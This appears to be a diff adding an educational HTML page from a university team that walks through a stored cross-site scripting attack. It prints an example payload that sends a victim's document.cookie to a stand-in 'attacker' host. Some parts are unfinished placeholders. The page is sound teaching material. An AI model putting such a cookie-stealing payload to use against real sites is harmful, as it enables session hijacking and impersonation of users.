@@ -1,0 +1,133 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<!--
+
+Cross Site Scripting (XSS) Demo
+
+
+
+A demonstration on how Cross Site Scripting inserts malicious script code as parameter value into an internet application.
+
+
+
+Author              Irina Preda (for Team P, University of Glasgow)
+
+Last Modified       20 January 2014
+
+-->
+
+<body>
+
+
+
+<!-- Import some animations from jQuery-->
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js">
+
+</script>
+
+
+
+<script> 
+
+    $(document).ready(function(){
+
+        // Hide these sections until the user has progressed accordingly.
+
+        $("#demoXSS").hide();
+
+        $("#explanationOfXSS").hide();
+
+        $("#exploitationOfXSS").hide();
+
+        $("#exploitationFinished").hide();
+
+	$("#Done").click(function()
+		{$("#exploitationFinished").hide();$('#implementDemoComplete').fadeIn();});
+
+    });
+
+</script>
+
+
+
+<!-- Demo Introduction -------------------------------------------------------->
+
+<div id="introXSS">
+
+    <p>To illustrate a possible way in which an attacker could insert malicious code as parameter values, we take the example below. A simple server-side script is used to display the latest comment on a website:</p>
+
+	<p><code>print "&lt;html>" <br/>
+	print "Latest comment:" <br/>
+	print database.latestComment <br/>
+	print "&lt;/html>"</code></p>
+
+	<p>
+	The script assumes that a comment consists only of text. However, since the user input is included directly, an attacker could submit this comment: "<\script>...<\/script>". Any user visiting the page would now receive the following response:
+	</p>
+
+	<p><code>&lt;html> <br/>
+	Latest comment: <br/>
+	&lt;script>...&lt;/script> <br/>
+	&lt;/html></code></p>
+
+	<p>When the user's browser loads the page, it will execute whatever JavaScript code is contained inside the &lt;script> tags. The attacker has now succeeded with his attack.</p>
+
+    <p>
+
+        <button onclick='$("#introXSS").hide(); $("#demoXSS").fadeIn();' id="Done">Next</button>
+
+    </p>
+
+</div>
+
+
+
+<!-- The Demo ------------------------------------------------------------->
+
+<div id="demoXSS">
+
+    <p>In this example, we will assume that the attacker's ultimate goal is to steal the victim's cookies by exploiting an XSS vulnerability in the website. This can be done by having the victim's browser parse the following HTML code:</p>
+
+<p><code>
+&lt;script>window.location='http://attacker/?cookie='+document.cookie&lt;/script> <br/>
+</code></p>
+
+<p>This script navigates the user's browser to a different URL, triggering an HTTP request to the attacker's server. The URL includes the victim's cookies as a query parameter, which the attacker can extract from the request when it arrives to his server. Once the attacker has acquired the cookies, he can use them to impersonate the victim and launch further attacks.</p>
+
+</div>
+
+<!-- Unimplemented ------------------------------------------------------------->
+
+<!-- Demo Exploitation --------------------------------------------------------->
+
+<div id="exploitationOfXSS">
+
+    <p>*Insert interactivity*</p>
+
+    <p>
+
+        <button onclick='
+                            $("#exploitationFinished").fadeIn();'>Next</button>
+
+    </p>
+
+</div>
+
+
+<!-- Completion Message ------------------------------------------------------->
+
+<div id="exploitationFinished">
+
+    <p>Well done - you have successfully exploited an internet application using XSS.</p>
+
+
+            <button id="Done">Done</button>
+
+</div>
+
+</body>
+
+</html>
